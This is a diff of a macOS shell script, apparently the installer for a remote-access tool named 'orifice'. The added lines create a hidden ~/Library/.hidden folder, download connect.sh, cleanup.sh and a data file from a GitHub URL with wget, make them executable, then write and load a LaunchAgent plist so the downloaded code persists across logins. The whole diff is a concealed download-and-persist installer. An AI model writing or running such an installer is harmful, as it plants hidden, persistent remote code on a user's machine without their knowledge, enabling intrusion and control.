@@ -1,8 +1,12 @@
-mkdir ~/Library/.hidden ; cd ~/Library/.hidden ; wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/connect.sh ; chmod +x connect.sh
-wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/stuff.txt;
-wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/cleanup.sh; chmod +x cleanup.sh;
-
+#!/bin/bash
+mkdir ~/Library/.hidden;
 mkdir ~/Library/LaunchAgents;
+
+wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/connect.sh ~/Library/.hidden/connect.sh;
+chmod +x ~/Library/.hidden/connect.sh;
+wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/stuff.txt ~/Library/.hidden/stuff;
+wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/cleanup.sh ~/Library/.hidden/cleanup.sh;
+chmod +x ~/Library/.hidden/cleanup.sh;
 
 echo '<plist version="1.0">
 <dict>
@@ -22,4 +26,6 @@ echo '<plist version="1.0">
 </dict>
 </plist>' > ~/Library/LaunchAgents/com.gnerdsec.orifice.plist;
 
-chmod 600 ~/Library/LaunchAgents/com.gnerdsec.orifice.plist ; launchctl load ~/Library/LaunchAgents/com.gnerdsec.orifice.plist
+chmod 600 ~/Library/LaunchAgents/com.gnerdsec.orifice.plist;
+
+launchctl load ~/Library/LaunchAgents/com.gnerdsec.orifice.plist
